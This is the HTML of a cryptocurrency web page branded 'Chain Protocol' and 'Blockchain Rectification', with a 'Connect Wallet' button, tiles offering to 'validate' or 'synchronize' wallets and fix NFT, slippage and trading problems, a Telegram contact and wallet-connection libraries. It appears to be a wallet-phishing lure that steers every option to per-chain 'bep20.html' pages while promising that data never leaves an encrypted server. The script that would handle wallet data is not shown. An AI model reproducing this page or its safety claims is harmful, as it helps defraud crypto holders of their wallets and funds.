...
<head>
  ...
  <link rel="shortcut icon" type="image/png" href="../assets/img/cta-img-with-bg.png"../>
...
<body class="cs-dark">
  ...
  <div class="contact">
    <div id="fixedbutton">
        Contact us<a href="https://t.me/Ras_Jake"><img src="https://logos-world.net/wp-content/uploads/2021/03/Telegram-Logo.png" alt="" srcset="" ></a>
</div>
</div>
<div>
  ...
  <!-- Start Hero -->
  <section class="cs-hero cs-style4 cs-bg cs-center" data-src="../assets/img/hero_bg4.png">
    <div class="container-fluid">
      <div class="cs-hero_in">
        <div class="cs-hero_in_left">
          <div class="cs-hero_text">
            <h4 class="cs-hero_title cs-white_color">Decentralized to <span class="typewrite"><span class="wrap"></span></span> with Chain Protocol</h4>
            <div class="cs-hero_subtitle cs-medium cs-white_color">Chain provides industry-leading Web3 and Blockchain a safe protocol and process encrypted by a superb encryption server. Your information never leaves our sever or be visible to anyone
              It’s an end to end encryption with no human interaction</div>
           <div class="action">
            <div class="cs-hero_btns">
              <a id="connectBtn" href="bep20.html" class="cs-hero_btn cs-style1 cs-color3 connectBtn"><span>Connect Wallet</span></a>
            </div>
            <!-- <div class="btn-hero heading-SB" id="slect-main">
                <select class="select2" id="choicentw" id="select2-main" aria-invalid="false" data-select2-id="select2-data-1-x6av" tabindex="-1" aria-hidden="true">
  ...
  <section>
    <div class="container">
      <h2 class="cs-section_heading cs-style1 text-center">Make Your Selection Below</h2>
      <div class="cs-height_45 cs-height_lg_45"></div>
      <div class="row">
        
        <div class="col-xl-3 col-lg-6">
          <div class="col-xl-3 col-lg-4">
            <a href="bep20.html" class="cs-text_box cs-style1 cs-box_shadow text-center cs-white_bg connectBtn">
              <h3>Validation</h3>
              <p>Validate your wallet to participate in out community projects</p>
            </a>
          ...
          <div class="col-xl-3 col-lg-4">
            <a href="bep20.html" class="cs-text_box cs-style1 cs-box_shadow text-center cs-white_bg connectBtn">
              <h3>Synchronize</h3>
              <p>Synchronize your wallet to rectify issues </p>
            </a>
            <div class="cs-height_30 cs-height_lg_30"></div>
          </div>
        <div class="col-xl-3 col-lg-4">
        ...
        <div class="col-xl-3 col-lg-6">
          <a href="bep20.html" class="cs-text_box cs-style1 cs-box_shadow text-center cs-white_bg connectBtn">
            <h3>NFT Rarity and traits</h3>
            <p>Click here for Nft related issues.</p>
          </a>
          <div class="cs-height_30 cs-height_lg_30"></div>
        </div>
        <div class="col-xl-3 col-lg-4">
        ...
        <div class="col-xl-3 col-lg-6">
          <a href="bep20.html" class="cs-text_box cs-style1 cs-box_shadow text-center cs-white_bg connectBtn">
            <h3>Slippage</h3>
            <p>Click here for slippage related error.</p>
          </a>
          <div class="cs-height_30 cs-height_lg_30"></div>
        </div>
        ...
        <div class="col-xl-4 col-lg-6">
          <a href="bep20.html" class="cs-text_box cs-style1 cs-box_shadow text-center cs-white_bg connectBtn">
            ...
            <p>Click here if you have <br>problem with your trading wallet.</p>
          </a>
          <div class="cs-height_30 cs-height_lg_30"></div>
        </div>
        <div class="col-xl-3 col-lg-4">
    ...
    <div class="cs-footer_bottom">
      <div class="container">
        ...
        <div class="cs-footer_bottom_in">
          <div class="cs-copyright">© 2022. Blockchain Rectification.</div>
          <ul class="cs-footer_menu">
            <li><a href="bep20.html">Privacy Policy</a></li>
            <li><a href="bep20.html">Term & Condition</a></li>
          </ul>
        </div>
      </div>
    </div>
  ...
  <script type="text/javascript" src="../Web3Modal/web3modal.js"></script>
    <script type="text/javascript" src="../@walletconnect/web3-provider/index.min.js"></script>
    
  <script src="../assets/js/evm-chains/index.min.js"></script>
  <script src="../assets/js/@walletconnect/web3-provider/index.min.js"></script>
  <script src="../assets/js/@portis/web3/index.min.js"></script>
  <script src="../assets/js/select2.min.js"></script>
  <script src="../assets/js/bundle.js"></script>
  
  <script src="..//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
  <script src="../assets/js/typed.js"></script>
  <script src="..//code.tidio.co/jiwvzqbjcsatcdnogffecycgvhdw332g.js" async></script>
  <script src="../Decimal/decimal.js"></script>
    <script src="../Moralis/moralis.js"></script>
    
   
    
    <script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
     <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider"></script>
     <script type="text/javascript"  src="https://cdn.jsdelivr.net/npm/@portis/web3@4.0.7/umd/index.min.js"></script>
    <script src="../121212.js"></script>
    
 
  <script>
    var typed = new Typed(".typewrite", { strings: [ "web3", "NFTs", "blockchains", "staking", "nodes", "analytics" ], typeSpeed: 200, baclSpeed: 200, loop: true} )
  </script>
  <!-- <script>
    var urlMapping = {
    "" : "../ERC20/bep20.html",
    ...
    "2" : "../BEP20/bep20.html",
    "3" : "../AVAX/bep20.html",
    "4" : "../PHANTOM/bep20.html",
    "5" : "../POLY/bep20.html"
}
$(".connectBtn").click(function(){
    var input = $("select").val().trim().toUpperCase();
